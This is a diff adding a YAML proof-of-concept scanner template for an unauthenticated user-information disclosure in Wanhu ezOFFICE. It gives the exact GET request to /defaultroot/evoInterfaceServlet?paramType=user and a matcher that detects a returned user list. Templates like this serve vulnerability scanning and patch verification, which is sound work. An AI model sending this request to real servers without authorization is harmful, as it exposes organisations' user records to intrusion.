@@ -1,0 +1,17 @@
+id: poc-yaml-wanhu-ezoffice-database-unauthorized-access
+info:
+  name: 万户 ezOFFICE 数据库用户信息未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 万户
+  osprey-id: vb_2022_0001
+requests:
+- method: GET
+  path: /defaultroot/evoInterfaceServlet?paramType=user
+  headers: {}
+  expression: 'contains(body, "{result:''success'', data:{\"userLis")
+
+    '
+variables: {}
+transport: http
